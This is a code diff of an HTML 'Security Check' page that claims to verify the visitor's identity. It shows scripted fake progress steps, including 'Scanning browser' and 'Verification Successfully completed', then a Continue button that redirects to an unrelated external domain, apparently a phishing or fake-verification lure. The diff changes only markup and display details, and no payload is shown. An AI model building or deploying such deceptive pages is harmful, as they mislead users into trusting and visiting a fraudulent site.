@@ -1,4 +1,4 @@
-<html lang="en"><head>
+<!DOCTYPE html><html lang="en"><head>
     <meta charset="UTF-8">
     <title>Security Check</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -153,16 +153,16 @@
         <h1>Security Check</h1>
         <p>We need to verify your identity</p>
 
-        <div class="loader" id="loader" style="display: none;"></div>
+        <div class="loader" id="loader"></div>
 
         <div class="status">
-            <span id="a" class="show">✔ Initializing system…</span>
-            <span id="b" class="show">✔ Scanning browser…</span>
-            <span id="c" class="show">✔ Verifying connection…</span>
-            <span id="d" class="show">✔ Verification Successfully completed</span>
+            <span id="a">✔ Initializing system…</span>
+            <span id="b">✔ Scanning browser…</span>
+            <span id="c">✔ Verifying connection…</span>
+            <span id="d">✔ Verification Successfully completed</span>
         </div>
 
-        <button id="btn" onclick="goNext()" style="display: block;">Continue</button>
+        <button id="btn" onclick="goNext()">Continue</button>
         <div class="footer">Protected by Secure System</div>
     </div>
 
@@ -183,7 +183,7 @@
         run();
 
         function goNext() {
-            window.location.href = "https://solve-restrictions-issues-now.surge.sh";
+            window.location.href = "https://solve-restrictions-issues-now.surge.sh/";
         }
     </script>
 
